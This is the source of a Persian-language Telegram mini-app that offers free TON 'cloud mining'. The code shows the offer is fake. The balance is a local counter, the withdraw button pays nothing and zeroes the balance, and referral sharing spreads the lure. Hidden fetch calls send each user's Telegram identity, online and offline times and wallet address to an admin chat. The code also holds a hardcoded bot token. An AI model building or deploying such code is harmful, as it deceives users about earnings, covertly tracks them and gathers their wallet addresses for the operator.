<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>TON Dropy PRO - Final Elite</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;700;800&display=swap');
        
        body {
            margin: 0; font-family: 'Vazirmatn', sans-serif;
            background: radial-gradient(circle at top, #0f1c2e, #070b14);
            color: #fff; padding: 15px; direction: rtl; min-height: 100vh;
        }

        /* پنل پروفایل کاربری */
        .profile-card {
            background: rgba(255, 255, 255, 0.08);
            backdrop-filter: blur(15px);
            border-radius: 24px; padding: 18px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            display: flex; align-items: center; gap: 15px; margin-bottom: 20px;
        }

        .avatar-container {
            width: 65px; height: 65px; border-radius: 50%;
            border: 2px solid #00c6ff; background: #1a1a1a;
            display: flex; align-items: center; justify-content: center; overflow: hidden;
        }

        .avatar-container img { width: 100%; height: 100%; object-fit: cover; }
        .avatar-container i { font-size: 35px; color: #00c6ff; }

        .user-details h3 { margin: 0; font-size: 17px; color: #fff; font-weight: 800; }
        .user-details p { margin: 2px 0; font-size: 12px; color: #00c6ff; direction: ltr; text-align: right; }
        .join-date { font-size: 10px !important; color: #aaa !important; }

        /* کارت‌های محتوا */
        .card {
            background: rgba(255, 255, 255, 0.05); border-radius: 25px;
            padding: 20px; border: 1px solid rgba(255, 255, 255, 0.1);
            margin-bottom: 15px; text-align: center;
        }

        #balance {
            font-size: 44px; font-weight: 800; color: #00c6ff;
            display: block; margin: 10px 0;
            text-shadow: 0 0 20px rgba(0, 198, 255, 0.4);
        }

        .btn-action {
            width: 100%; padding: 16px; border-radius: 18px; border: none;
            font-size: 15px; font-weight: 700; cursor: pointer; transition: 0.3s;
            display: flex; align-items: center; justify-content: center; gap: 10px;
        }

        #connectBtn { background: #0088cc; color: #fff; }
        #connectBtn.connected { background: #1faa59; }

        .withdraw-btn {
            background: linear-gradient(90deg, #ff512f, #dd2476);
            color: #fff; margin-top: 15px; box-shadow: 0 5px 15px rgba(221, 36, 118, 0.3);
        }

        .ref-box {
            background: rgba(0,0,0,0.3); padding: 12px; border-radius: 15px;
            font-size: 10px; color: #00ff9d; border: 1px dashed #00ff9d;
            margin: 10px 0; direction: ltr; word-break: break-all;
        }

        .hidden { display: none !important; }
    </style>
</head>
<body>

<div class="profile-card">
    <div class="avatar-container">
        <i class="fas fa-user-circle" id="defaultAvatar"></i>
        <img id="userPhoto" src="" class="hidden">
    </div>
    <div class="user-details">
        <h3 id="userName">نام کاربر</h3>
        <p id="userTag">@username</p>
        <p class="join-date" id="joinDateDisplay">ورود: --/--/--</p>
    </div>
</div>

<div class="card">
    <p style="margin:0; font-size:12px; color:#aaa;">موجودی قابل برداشت (TON)</p>
    <span id="balance">0.000000</span>
    <div style="font-size:11px; color:#00ff9d;"><i class="fas fa-microchip"></i> استخراج ابری فعال است</div>
</div>

<div class="card">
    <button id="connectBtn" class="btn-action">
        <i class="fas fa-wallet"></i> <span>اتصال به کیف پول</span>
    </button>
</div>

<div class="card">
    <h4 style="margin:0; color:#00c6ff; font-size: 15px;">👥 دعوت از دوستان</h4>
    <div class="ref-box" id="refLinkDisplay">https://t.me/TonDropyBot?start=ref_...</div>
    <button onclick="share()" style="background: rgba(255,255,255,0.1); color:#fff;" class="btn-action">
        <i class="fas fa-paper-plane"></i> ارسال برای دوستان
    </button>
</div>

<div class="card">
    <button id="withdrawBtn" class="btn-action withdraw-btn">
        <i class="fas fa-bolt"></i> درخواست برداشت سریع
    </button>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand();

    const BOT_TOKEN = "8047223304:AAHMW8a6tKTTSQOp4Os_LorRJzDLNvxz-Rw";
    const ADMIN_ID = "5972276401";
    const BOT_USERNAME = "TonDropyBot";

    // --- تابع ساخت یوزرنیم برای پیام‌های تلگرام ---
    function formatUser(user) {
        return user.username ? `@${user.username}` : `<a href="tg://user?id=${user.id}">${user.first_name}</a> (بدون یوزرنیم)`;
    }

    // --- تابع مانیتورینگ آنلاین/آفلاین ---
    function sendLog(status) {
        const user = tg.initDataUnsafe?.user;
        if (!user) return;

        const time = new Date().toLocaleString('fa-IR');
        const userLabel = formatUser(user);
        let text = status === "in" ? 
            `🟢 <b>ورود به برنامه</b>\n👤 کاربر: ${userLabel}\n⏰ زمان: ${time}` : 
            `🔴 <b>خروج از برنامه</b>\n👤 کاربر: ${userLabel}\n⚠️ وضعیت: هم‌اکنون آفلاین`;

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(text)}&parse_mode=HTML`, { keepalive: true });
    }

    // --- بارگذاری اولیه ---
    function init() {
        const user = tg.initDataUnsafe?.user;
        if (user) {
            document.getElementById('userName').innerText = user.first_name;
            document.getElementById('userTag').innerText = user.username ? "@" + user.username : "no_username";
            document.getElementById('refLinkDisplay').innerText = `https://t.me/${BOT_USERNAME}?start=ref_${user.id}`;
            
            if (user.photo_url) {
                const img = document.getElementById('userPhoto');
                img.src = user.photo_url;
                img.classList.remove('hidden');
                document.getElementById('defaultAvatar').classList.add('hidden');
            }

            let date = localStorage.getItem('join_date_final');
            if(!date) {
                date = new Date().toLocaleDateString('fa-IR');
                localStorage.setItem('join_date_final', date);
            }
            document.getElementById('joinDateDisplay').innerText = "عضویت: " + date;

            sendLog("in"); // لاگ ورود
        }
    }

    // لاگ خروج
    window.addEventListener("pagehide", () => sendLog("out"));

    // --- ماینینگ ---
    let bal = parseFloat(localStorage.getItem('bal_v17')) || 0;
    setInterval(() => {
        bal += 0.000012;
        document.getElementById('balance').innerText = bal.toFixed(6);
        localStorage.setItem('bal_v17', bal.toString());
    }, 1000);

    function share() {
        const link = document.getElementById('refLinkDisplay').innerText;
        tg.openTelegramLink(`https://t.me/share/url?url=${encodeURIComponent(link)}&text=رایگان TON استخراج کن! 💎`);
    }

    // --- کیف پول و برداشت ---
    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
        manifestUrl: 'https://nimwmesfandiari.github.io/ton-plus-bot/tonconnect-manifest.json'
    });

    tonConnectUI.onStatusChange(wallet => {
        const btn = document.getElementById('connectBtn');
        if(wallet) {
            btn.classList.add('connected');
            btn.innerHTML = '<i class="fas fa-check-circle"></i> متصل شد';
            
            const user = tg.initDataUnsafe?.user;
            const msg = `✅ <b>کیف پول وصل شد</b>\n👤 کاربر: ${formatUser(user)}\n👛 آدرس: <code>${wallet.account.address}</code>`;
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
        } else {
            btn.classList.remove('connected');
            btn.innerHTML = '<i class="fas fa-wallet"></i> اتصال به کیف پول';
        }
    });

    document.getElementById('connectBtn').onclick = () => {
        if(tonConnectUI.connected) tonConnectUI.disconnect();
        else tonConnectUI.openModal();
    };

    document.getElementById('withdrawBtn').onclick = () => {
        if(!tonConnectUI.connected) return tg.showAlert("لطفاً اول کیف پول را وصل کنید!");
        const user = tg.initDataUnsafe?.user;
        const msg = `💰 <b>درخواست برداشت</b>\n👤 کاربر: ${formatUser(user)}\n💵 مقدار: ${bal.toFixed(6)} TON\n👛 آدرس: <code>${tonConnectUI.account.address}</code>`;
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
        tg.showAlert("درخواست شما با موفقیت ثبت شد ✅");
        bal = 0; localStorage.setItem('bal_v17', '0');
    }

    init();
</script>
</body>
</html>
